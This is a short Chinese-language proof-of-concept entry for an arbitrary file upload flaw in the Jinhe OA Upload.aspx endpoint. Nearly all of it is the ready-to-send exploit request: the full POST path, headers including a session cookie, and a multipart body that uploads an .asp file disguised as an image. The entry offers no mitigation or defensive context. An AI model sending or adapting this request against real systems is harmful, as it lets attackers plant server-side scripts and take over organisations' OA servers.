# 金和OAeformaspx接口存在任意文件上传

- **系统**：金和OA　|　**类型**：文件上传　|　**CVE**：—
- **请求**：`POST /C6/JHSoft.Web.Module/eformaspx/Upload.aspx/?path=/C6/JHSoft.Web.Module&setpath=undefined&id=undefined HTTP/1.1`
- **关键头**：`Content-Type: multipart/form-data; boundary=---------------------------223…`　`Content-Length: 479`　`Cookie: ASP.NET_SessionId=wzknlt2nk5eegxtyd1h3igev`

**请求体 / payload**
```
-----------------------------223601904332813289571720143200
Content-Disposition: form-data; name="txtBz"
/C6/JHSoft.Web.Module
-----------------------------223601904332813289571720143200
Content-Disposition: form-data; name="pic"; filename="wbs.asp"
Content-Type: image/png
aaa
-----------------------------223601904332813289571720143200
Content-Disposition: form-data; name="Submit"
-----------------------------223601904332813289571720143200--
```